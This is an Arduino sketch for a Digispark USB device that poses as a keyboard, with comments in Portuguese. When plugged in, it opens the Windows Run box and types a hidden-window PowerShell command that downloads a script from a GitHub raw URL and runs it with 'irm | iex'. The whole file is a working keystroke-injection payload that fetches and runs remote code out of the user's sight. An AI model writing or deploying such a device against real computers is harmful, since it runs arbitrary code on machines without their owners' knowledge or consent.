#include "DigiKeyboardPtBr.h" 

void setup() {
  // Acorda o dispositivo USB
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(3000); // Tempo para o Windows reconhecer o pendrive

  // 1. Abre a caixa "Executar" (Tecla Windows + R)
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(1000); // Espera 1 segundo para a janelinha abrir

  // 2. Digita o comando PowerShell invisível e executa
  // ATENÇÃO: Mudei o final do link de .sh para .ps1
  DigiKeyboardPtBr.println("powershell -w hidden -c \"irm https://raw.githubusercontent.com/fabiobrilhante/exemplo/main/mensagem.ps1 | iex\"");
}

void loop() {
  // Mantém a conexão viva sem fazer nada
  DigiKeyboardPtBr.update();
  DigiKeyboardPtBr.delay(100);
}
